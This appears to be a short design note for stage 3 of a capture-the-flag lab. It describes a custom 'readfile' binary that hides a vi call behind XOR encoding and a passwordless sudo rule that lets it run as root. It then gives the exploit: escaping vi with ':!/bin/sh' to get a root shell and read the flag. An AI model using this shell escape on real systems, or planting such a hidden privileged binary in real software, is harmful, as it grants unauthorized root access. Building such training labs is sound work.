# Stage 3 — Root via readfile → vi escape

## Binary
`readfile` is compiled from `stages/base/readfile.c` and installed at `/usr/bin/readfile`.
The binary XOR-decodes `/usr/bin/vi %s` at runtime to obscure the string from `strings`.

## Sudo rule
```
mitchel ALL=(root) NOPASSWD: /usr/bin/readfile /home/jake/todolist.txt
```

## Exploit
```sh
sudo /usr/bin/readfile /home/jake/todolist.txt
# vi opens the file
:!/bin/sh
# root shell
cat /root/flag.txt
```
